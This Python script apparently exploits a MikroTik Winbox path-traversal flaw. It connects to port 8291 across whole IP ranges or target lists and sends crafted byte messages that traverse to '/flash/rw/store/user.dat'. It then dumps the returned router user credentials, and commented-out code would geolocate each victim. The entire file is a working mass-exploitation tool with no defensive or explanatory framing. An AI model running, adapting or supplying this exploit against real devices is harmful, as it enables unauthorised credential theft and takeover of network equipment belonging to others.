#!/usr/bin/env python3
import socket
import sys
from extract_user import dump
import ipcalc
import hashlib
import requests
import optparse

parser = optparse.OptionParser()
parser.add_option('-f', '--fileName',action="store", dest="fileName",help="enter text file", default="empty")
parser.add_option('-p', '--port',action="store", dest="port",help="enter deffrent port number", default="empty")
inputSw, args = parser.parse_args()

hello = [0x68, 0x01, 0x00, 0x66, 0x4d, 0x32, 0x05, 0x00,
         0xff, 0x01, 0x06, 0x00, 0xff, 0x09, 0x05, 0x07,
         0x00, 0xff, 0x09, 0x07, 0x01, 0x00, 0x00, 0x21,
         0x35, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f, 0x2e, 0x2f,
         0x2e, 0x2e, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f,
         0x2e, 0x2f, 0x2e, 0x2e, 0x2f, 0x2f, 0x2f, 0x2f,
         0x2f, 0x2f, 0x2e, 0x2f, 0x2e, 0x2e, 0x2f, 0x66,
         0x6c, 0x61, 0x73, 0x68, 0x2f, 0x72, 0x77, 0x2f,
         0x73, 0x74, 0x6f, 0x72, 0x65, 0x2f, 0x75, 0x73,
         0x65, 0x72, 0x2e, 0x64, 0x61, 0x74, 0x02, 0x00,
         0xff, 0x88, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00,
         0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0xff, 0x88,
         0x02, 0x00, 0x02, 0x00, 0x00, 0x00, 0x02, 0x00,
         0x00, 0x00]

getData = [0x3b, 0x01, 0x00, 0x39, 0x4d, 0x32, 0x05, 0x00,
            0xff, 0x01, 0x06, 0x00, 0xff, 0x09, 0x06, 0x01,
            0x00, 0xfe, 0x09, 0x35, 0x02, 0x00, 0x00, 0x08,
            0x00, 0x80, 0x00, 0x00, 0x07, 0x00, 0xff, 0x09,
            0x04, 0x02, 0x00, 0xff, 0x88, 0x02, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01,
            0x00, 0xff, 0x88, 0x02, 0x00, 0x02, 0x00, 0x00,
            0x00, 0x02, 0x00, 0x00, 0x00]

if inputSw.port == "empty":
    portNumber = 8291
else:
    portNumber = int(inputSw.port)

if inputSw.fileName == "empty":
    targets = ipcalc.Network(sys.argv[1])
else:
    ipArray = []
    for line in open(inputSw.fileName,"r"):
        ipArray.append(line.strip())
    targets = ipArray

for singleIp in targets:
    ip = str(singleIp)
    if __name__ == "__main__":
         try:
             #Socket
             theSocket = socket.socket()
             theSocket.settimeout(1)
             theSocket.connect((ip, portNumber))
             hello = bytearray(hello)
             getData = bytearray(getData)

             #get sesison id
             theSocket.send(hello)
             result = bytearray(theSocket.recv(1024))
             #copy session id
             getData[19] = result[38]
             #Send Request
             theSocket.send(getData)
             result = bytearray(theSocket.recv(1024))
             #Get results
             print(ip, ' ', end='')
             # print(d[55:])
             # r = requests.get('http://ip-api.com/json/'+ip+'?fields=country,regionName,city,lat,lon,isp,org,as,reverse')
             # print(r.json()['regionName'],',',r.json()['country'])
             # print(r.json()['lat'],',',r.json()['lon'])
             # print(r.json()['isp'])
             # # print(r.json()['org'])
             # print(r.json()['as'])
             # print(r.json()['reverse'])
             dump(result[55:])
         except socket.timeout:
              print(singleIp,": Connection Timeout")
         except ConnectionRefusedError:
              print(singleIp,": Connection Refused")
         except ConnectionResetError:
              print(singleIp,": Connection Reset")
         except IndexError:
              print(singleIp,": Index Error")
         except socket.error:
             print(singleIp,": Socket Error")      
